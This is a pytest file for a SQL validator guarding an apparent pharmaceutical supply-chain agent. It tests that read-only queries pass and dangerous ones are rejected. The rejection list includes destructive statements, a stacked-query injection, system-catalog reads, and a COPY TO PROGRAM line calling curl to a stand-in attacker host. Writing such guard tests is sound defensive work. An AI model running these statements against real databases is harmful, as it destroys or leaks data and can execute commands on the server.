import pytest

from pharma_scm.agent.sql_guard import SqlRejected, validate

OK = [
    "SELECT count(*) FROM products",
    "select sku from products where safety_stock > 100 order by 1;",
    "WITH t AS (SELECT sku FROM inventory_lots) SELECT * FROM t",
    "SELECT p.sku FROM products p LEFT JOIN inventory_lots l ON l.sku = p.sku",
    "SELECT * FROM products UNION SELECT * FROM products",
    "SELECT sku FROM products /* 주석 */ WHERE sku = 'SKU-001'",
]
BAD = [
    "DROP TABLE products",
    "SELECT 1; DROP TABLE products",
    "UPDATE products SET safety_stock = 0",
    "DELETE FROM inventory_lots",
    "INSERT INTO products VALUES (1)",
    "SELECT * INTO t FROM products",
    "WITH x AS (DELETE FROM products RETURNING *) SELECT * FROM x",
    "SELECT * FROM shortage_events",
    "SELECT * FROM sop_sections",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT pg_sleep(10)",
    "SELECT set_config('x', 'y', false)",
    "COPY products TO PROGRAM 'curl http://evil.example.com'",
    "SELECT FROM WHERE",
    "",
]


@pytest.mark.parametrize("sql", OK)
def test_allows_read_queries(sql):
    assert validate(sql).upper().startswith(("SELECT", "WITH"))


@pytest.mark.parametrize("sql", BAD)
def test_rejects_dangerous_or_invalid(sql):
    with pytest.raises(SqlRejected):
        validate(sql)


def test_comments_are_stripped():
    assert "주석" not in validate("SELECT 1 /* 주석 */ FROM products")
